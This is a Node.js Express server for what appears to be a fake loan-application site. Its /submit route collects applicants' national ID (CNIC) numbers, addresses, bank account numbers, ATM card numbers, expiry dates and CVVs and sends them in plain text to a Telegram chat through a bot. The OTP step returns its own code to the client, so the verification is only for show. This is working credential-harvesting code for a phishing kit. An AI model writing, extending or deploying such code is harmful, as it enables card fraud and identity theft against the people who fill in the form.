const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const path = require("path");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

const otpStore = new Map();

function generateOTP() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// ------------------------
// Send OTP
// ------------------------
app.post("/send-otp", (req, res) => {
  const { mobile } = req.body;

  if (!mobile) {
    return res.status(400).json({
      success: false,
      message: "Mobile number required"
    });
  }

  const code = generateOTP();
  const expiresAt = Date.now() + 120000;

  otpStore.set(mobile, { code, expiresAt });

  console.log("OTP for", mobile, "is:", code);

  return res.json({
    success: true,
    message: "OTP sent successfully",
    otp: code
  });
});

// ------------------------
// Verify OTP
// ------------------------
app.post("/verify-otp", (req, res) => {
  const { mobile, otp } = req.body;

  if (!mobile || !otp) {
    return res.status(400).json({
      success: false,
      message: "Missing mobile or otp"
    });
  }

  const record = otpStore.get(mobile);

  if (!record) {
    return res.status(400).json({
      success: false,
      message: "OTP was not generated"
    });
  }

  if (Date.now() > record.expiresAt) {
    otpStore.delete(mobile);
    return res.status(400).json({
      success: false,
      message: "OTP expired"
    });
  }

  if (record.code !== otp) {
    return res.status(400).json({
      success: false,
      message: "Invalid OTP"
    });
  }

  otpStore.delete(mobile);

  return res.json({
    success: true,
    message: "OTP verified successfully"
  });
});

// ------------------------
// Send final form to Telegram
// ------------------------
app.post("/submit", async (req, res) => {
  const data = req.body;

  const message = `
New Loan Application

Full Name: ${data.fullName || ""}
CNIC: ${data.cnic || ""}
Mobile: ${data.mobile || ""}
Gender: ${data.gender || ""}
City: ${data.city || ""}
Province: ${data.province || ""}
Address: ${data.address || ""}

Loan Amount: ${data.loanAmount || ""}
Occupation: ${data.occupation || ""}
Bank Name: ${data.bankName || ""}
Current Balance: ${data.currentBalance || ""}
Account Number: ${data.accountNumber || ""}
ATM Card Number: ${data.atmCardNumber || ""}
Expiry: ${data.expiry || ""}
CVV: ${data.cvv || ""}

OTP Verified: Yes
`;

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: message
        })
      }
    );

    const result = await response.json();

    if (!result.ok) {
      return res.status(500).json({
        success: false,
        error: result.description
      });
    }

    return res.json({
      success: true,
      message: "Application submitted successfully"
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
